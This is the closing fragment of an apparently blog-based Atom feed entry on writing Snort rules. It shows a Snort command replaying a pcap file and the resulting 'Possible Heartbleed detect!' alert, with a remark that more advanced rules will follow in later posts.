&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;snort &lt;span class=&quot;nt&quot;&gt;-q&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; console &lt;span class=&quot;nt&quot;&gt;--daq&lt;/span&gt; pcap &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; /etc/nsm/rules/local.rules &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; none &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; PCAPs/heart.pcap
04/16-12:00:41.512593  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:10000003:1] Possible Heartbleed detect! &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 0] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 172.16.121.1:64667 -&amp;gt; 172.16.121.150:443
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;There are far more advanced Snort rules, the aboves are just some basic of Snort. We probably want to write more complex rules in the future posts with Snort.&lt;/p&gt;</content><author><name></name></author><category term="traffic_analysis" /><category term="defense" /><category term="snort" /><summary type="html">Overview In this post, we will focus on writing Snort rules to detect real-world attacks based on inspecting and analyzing malicious traffic.</summary></entry></feed>